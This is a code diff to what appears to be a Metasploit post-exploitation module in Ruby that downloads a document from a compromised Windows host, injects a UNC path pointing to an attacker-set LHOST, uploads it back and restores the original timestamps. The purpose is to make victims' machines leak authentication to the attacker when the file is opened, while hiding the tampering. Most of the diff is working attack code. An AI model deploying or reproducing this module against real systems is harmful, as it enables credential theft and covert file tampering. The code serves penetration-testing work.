@@ -9,6 +9,7 @@ require 'msf/core'
 require 'msf/core/post/file'
 require 'zip/zip' #for extracting files
 require 'rex/zip' #for creating files
+require 'msf/core/post/windows/priv'
 
 class Metasploit3 < Msf::Post
 
@@ -41,7 +42,6 @@ class Metasploit3 < Msf::Post
 			[
 					OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to']),
 					OptString.new('FILE', [true, 'Remote file to inject UNC path into. ']),
-					OptPath.new('BACKUPDIR', [true, 'Directory to put original documents for backup']),
 					OptBool.new('BACKUP', [true, 'Make local backup of remote file.', 'True']),
 			], self.class)
 	end
@@ -51,43 +51,10 @@ class Metasploit3 < Msf::Post
 		begin
 			mace = session.priv.fs.get_file_mace(datastore['FILE'])
 			vprint_status("Got file MACE attributes!")
-		rescue => e
+		rescue
 			print_error("Error getting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
-			print e.message
 		end
 		return mace
-	end
-
-	#using Tempfile does not work, because if Ruby garbage collects they are gone before we can use it, so we do it manually
-	def write_tmp(filedata)
-		tmp = File.join(Dir.tmpdir, Time.now.to_i.to_s + rand(5555).to_s)
-		File.open(tmp, 'wb') {|f| f.write(filedata) }
-		return tmp
-	end
-
-
-	#We make a backup of the original and return the full path and filename when done.
-	def make_backup(zipfile)
-		if not File.directory?(datastore['BACKUPDIR'])
-			print_error("Backup directory #{datastore['BACKUPDIR']} does not exist.")
-			return nil
-		end
-
-		#basename wont work, so we do it the regex way
-		if session.platform.include?'win'
-			tempname = datastore['FILE'].split("\\").last
-		else
-			tempname = datastore['FILE'].split("/").last
-		end
-
-		dst_filename = File.join(datastore['BACKUPDIR'], tempname)
-		begin
-			File.open(dst_filename,'wb') {|f| f.write(zipfile)}
-			return dst_filename
-		rescue
-			print_error("Error saving backup file to #{datastore['BACKUPDIR']}.")
-			return nil
-		end
 	end
 
 	#here we unzip into memory, inject our UNC path, store it in a temp file and
@@ -163,16 +130,13 @@ class Metasploit3 < Msf::Post
 		return zip_data
 	end
 
-	#making the actual docx we write to a temp file,
-	#because upload_file needs a file as source
+	#making the actual docx
 	def zip_docx(zip_data)
 		docx = Rex::Zip::Archive.new
 		zip_data.each_pair do |k,v|
 			docx.add_file(k,v)
 		end
-
-		tmp_file_name = write_tmp(docx.pack)
-		return tmp_file_name
+		return docx.pack
 	end
 
 	#We try put the mace values back to that of the original file
@@ -192,7 +156,7 @@ class Metasploit3 < Msf::Post
 		backup_filename = ""
 
 		#sadly OptPath does not work, so we check manually if it exists
-		if not session.fs.file.exists?(datastore['FILE'])
+		if !file_exist?(datastore['FILE'])
 			print_error("Remote file does not exist!")
 			return
 		end
@@ -202,63 +166,37 @@ class Metasploit3 < Msf::Post
 		file_mace = get_mace
 
 		#download the remote file
-		file_data = session.fs.file.new("#{datastore['FILE']}", 'rb')
-		begin
-			print_status("Downloading remote file #{datastore['FILE']}.")
-			until file_data.eof?
-				data = file_data.read
-				zipfile << data if not data.nil?
-			end
-			print_status("Remote file #{datastore['FILE']} downloaded.")
-			file_data.close
-		rescue EOFError
-			print_error("Error reading remote file.")
-			return
-		end
+		print_status("Downloading remote file #{datastore['FILE']}.")
+		org_file_data = read_file(datastore['FILE'])
 
-		#Create local backup of remote file if wanted else a temp file
-		#Either way we need a local file to use because you cannot extract a zipfile into memory.
-		if datastore['BACKUP']
-			backup_filename = make_backup(zipfile)
-			if backup_filename.nil?
-				return
-			else
-				print_status("Local backup of original file stored at #{backup_filename}.")
-				tmp_zipfile = backup_filename
-			end
-		else #no backup, so we use a temporary file instead
-				print_warning("Not storing a local backup of original file!")
-				tmp_zipfile = write_tmp(zipfile)
-		end
+		#store the original file because we need to unzip from disk because there is no memory unzip
+		logs_dir = ::File.join(Msf::Config.log_directory, 'unc_injector')
+		FileUtils.mkdir_p(logs_dir)
+		org_file =  logs_dir + File::Separator + datastore['FILE'].split('\\').last
+		vprint_status("Written remote file to #{org_file}")
+		File.open(org_file, 'wb') { |f| f.write(org_file_data)}
 
-		#Unzip, insert our UNC path, zip and return the filename of the injected temp file for upload
-		modified_zip_name = manipulate_file(tmp_zipfile)
-		if modified_zip_name.nil?
+		#Unzip, insert our UNC path, zip and return the data of the modified file for upload
+		injected_file = manipulate_file(org_file)
+		if injected_file.nil?
 			return
 		end
 
 		#upload the injected file
-		begin
-			session.fs.file.upload_file(datastore['FILE'], modified_zip_name)
-			print_status("Uploaded injected file to remote #{datastore['FILE']}...")
-		rescue => e
-			print_error("Error uploading file to #{datastore['FILE']}: #{e.class} #{e}")
-			return
-		end
-
-		#cleanup of local temp files
-		FileUtils.rm(modified_zip_name)
-		if not datastore['BACKUP']
-			FileUtils.rm(tmp_zipfile)
-		end
+		write_file(datastore['FILE'], injected_file)
+		print_status("Uploaded injected file.")
 
 		#set mace values back to that of original
 		set_mace(file_mace)
 
-		#Store information in note database so its obvious what we changed, were we stored the backup file (if we did)
+		#Store information in note database so its obvious what we changed, were we stored the backup file..or remove if no backup is desired
 		note_string ="Remote file #{datastore['FILE']} contains UNC path to #{datastore['LHOST']}. "
 		if datastore['BACKUP']
-			note_string += " Local backup of file at #{backup_filename}."
+			note_string += " Local backup of file at #{org_file}."
+			print_status("Local backup kept at #{org_file}")
+		else
+			FileUtils.rm_rf(org_file)
+			print_status("Local copy #{org_file} deleted.")
 		end
 
 		report_note(:host => session.session_host,
@@ -275,6 +213,6 @@ class Metasploit3 < Msf::Post
 			}
 		)
 
-		print_good("Done! File #{datastore['FILE']} succesfully injected to point to #{datastore['LHOST']}")
+		print_good("Done! Remote file #{datastore['FILE']} succesfully injected to point to #{datastore['LHOST']}")
 	end
 end
